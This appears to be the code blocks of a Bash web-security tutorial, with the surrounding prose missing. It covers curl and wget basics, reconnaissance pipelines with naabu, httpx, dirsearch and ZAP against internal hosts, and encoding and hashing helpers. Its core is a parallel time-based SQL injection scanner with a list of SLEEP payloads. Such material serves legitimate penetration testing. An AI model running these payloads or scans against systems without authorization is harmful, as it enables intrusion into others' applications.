["```\n $ sudo apt update && sudo apt install -y zaproxy curl wget parallel chromium\n$ sudo apt remove python3-httpx\n```", "```\n #!/usr/bin/env bash\nresponse=$(curl -s -o /dev/null -w \"%{http_code}\" https://example.com)\nif [ \"$response\" -eq 200 ]; then\n  echo \"Request was successful.\" else\n  echo \"Request failed with response code $response.\" fi\n```", "```\n for i in {1..10}; do\n  curl -X GET \"https://example.com/page$i\" -H \"Authorization: Bearer <token>\"\ndone\n```", "```\n #!/usr/bin/env bash\ncheck_dependencies() {\n    for cmd in curl parallel; do\n        if ! command -v $cmd &> /dev/null; then\n            echo \"$cmd could not be found. Please install it.\"             exit 1\n        fi\n    done\n}\n```", "```\n print_usage() {\n    echo \"Usage: $0 -u URL -c COOKIE_HEADER\"\n    echo \"       $0 -f URL_FILE -c COOKIE_HEADER\"\n    echo \"URL must contain 'FUZZ' where payloads should be inserted.\" }\n```", "```\n perform_sqli_test() {\n    local url=$1\n    local cookie_header=$2\n```", "```\n if [[ $url != *\"FUZZ\"* ]]; then\n        echo \"Error: URL must contain 'FUZZ' where payloads should be inserted.\"         print_usage\n        exit 1\n    fi\n```", "```\n local payloads=(\n        \"(SELECT(0)FROM(SELECT(SLEEP(7)))a)\"\n        \"'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z\"\n        \"' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--\"\n        \"if(now()=sysdate(),SLEEP(7),0)\"\n        \"'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z\"\n        \"'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z\"\n    )\n```", "```\n for payload in \"${payloads[@]}\"; do\n        start_time=$(date +%s)\n```", "```\n fuzzed_url=${url//FUZZ/$payload}\n```", "```\n if [ -n \"$cookie_header\" ]; then\n            curl -s -o /dev/null --max-time 20 -H \"Cookie: $cookie_header\" \"$fuzzed_url\"\n        else\n            curl -s -o /dev/null --max-time 20 \"$fuzzed_url\"\n        fi\n```", "```\n end_time=$(date +%s)\n        duration=$((end_time - start_time))\n```", "```\n if ((duration >= 7 && duration <= 16)); then\n            echo \"Potential time-based SQL injection vulnerability detected on $url with payload: $payload\"\n            break\n        fi\n    done\n}\nexport -f perform_sqli_test\n```", "```\n process_urls() {\n    local url_list=$1\n    local cookie_header=$2\n    if [ -f \"$url_list\" ]; then\n        cat \"$url_list\" | parallel perform_sqli_test {} \"$cookie_header\"\n    else\n        perform_sqli_test \"$url_list\" \"$cookie_header\"\n    fi\n}\n```", "```\n check_dependencies\n```", "```\n while getopts \"u:f:c:\" opt; do\n    case $opt in\n        u) URL=$OPTARG ;;\n        f) URL_FILE=$OPTARG ;;\n        c) COOKIE_HEADER=$OPTARG ;;\n        *) echo \"Invalid option: -$OPTARG\" ;;\n    esac\ndone\n```", "```\n if [ -z \"$URL\" ] && [ -z \"$URL_FILE\" ]; then\n    echo \"You must provide a URL with -u or a file containing URLs with -f.\"     print_usage\n    exit 1\nfi\n```", "```\n if [ -n \"$URL\" ]; then\n    process_urls \"$URL\" \"$COOKIE_HEADER\"\nelif [ -n \"$URL_FILE\" ]; then\n    process_urls \"$URL_FILE\" \"$COOKIE_HEADER\"\nfi\n```", "```\n $ wget http://example.com/file.zip\n```", "```\n $ wget -O newname.zip http://example.com/file.zip\n```", "```\n $ wget -c http://example.com/file.zip\n```", "```\n $ wget -b http://example.com/file.zip\n```", "```\n $ wget -r -p -k http://example.com/\n```", "```\n $ wget --limit-rate=100k http://example.com/file.zip\n```", "```\n $ wget -r -A pdf http://example.com/\n```", "```\n $ echo 10.2.10.0/24 | mapcidr -silent\n```", "```\n $ echo 10.2.10.1 | naabu -silent -p 4712,5005,5555,8080,8090,8111 | httpx -silent | dirsearch --stdin --full-url -q -o dirsearch.csv --format=csv\n```", "```\n $ awk -F',' '$2 == 200 || $2 == 302 {print $0}' dirsearch.csv\n```", "```\n $ /usr/share/zaproxy/zap.sh -h\n```", "```\n $ /usr/share/zaproxy/zap.sh -cmd -addoninstall wappalyzer\n```", "```\n $ /usr/share/zaproxy/zap.sh -cmd -addonupdate -quickurl http://10.2.10.1:5555/ -quickout $(pwd)/zap.json\n```", "```\n $ echo -n hello | base64\naGVsbG8=\n```", "```\n $ echo -n aGVsbG8= | base64 -d\nhello\n```", "```\n url_safe_base64_encode() {\n  base64 | tr '+/' '-_' | tr -d '='\n}\n```", "```\n url_safe_base64_decode() {\n  tr '-_' '+/' | base64 --decode\n}\n```", "```\n md5_hash() {\n  md5sum | awk '{print $1}'\n}\n```", "```\n $ echo helloworld | md5_hash\nd73b04b0e696b0945283defa3eee4538\n```", "```\n sha256_hash() {\n  sha256sum | awk '{print $1}'\n}\n```", "```\n $ echo helloworld | sha256_hash\n8cd07f3a5ff98f2a78cfc366c13fb123eb8d29c1ca37c79df190425d5b9e424d\n```", "```\n aes_encrypt() {\n  local password=\"$1\"\n  openssl enc -aes-256-cbc -base64 -pbkdf2 -pass pass:\"$password\"\n}\n```", "```\n aes_decrypt() {\n  local password=\"$1\"\n  openssl enc -aes-256-cbc -d -base64 -pbkdf2 -pass pass:\"$password\"\n}\n```", "```\n $ echo \"data to be encrypted\" | aes_encrypt 'Passw0rd!' | aes_decrypt 'Passw0rd!' data to be encrypted\n```", "```\n html_encode() {\n  local input\n  input=$(cat)\n  input=\"${input//\\&/\\&amp;}\"\n  input=\"${input//\\</\\&lt;}\"\n  input=\"${input//\\>/\\&gt;}\"\n  input=\"${input//\\\"/\\&quot;}\"\n  input=\"${input//\\'/\\&apos;}\"\n  echo \"$input\"\n}\n```", "```\n $ echo 'hello<script>world' | html_encode\nhello&lt;script&gt;world\n```", "```\n html_decode() {\n  local input\n  input=$(cat)\n  input=\"${input//\\&apos;/\\'}\"\n  input=\"${input//\\&quot;/\\\"}\"\n  input=\"${input//\\&gt;/\\>}\"\n  input=\"${input//\\&lt;/\\<}\"\n  input=\"${input//\\&amp;/\\&}\"\n  echo \"$input\"\n}\n```", "```\n $ echo 'hello&lt;script&gt;world' | html_decode\nhello<script>world\n```"]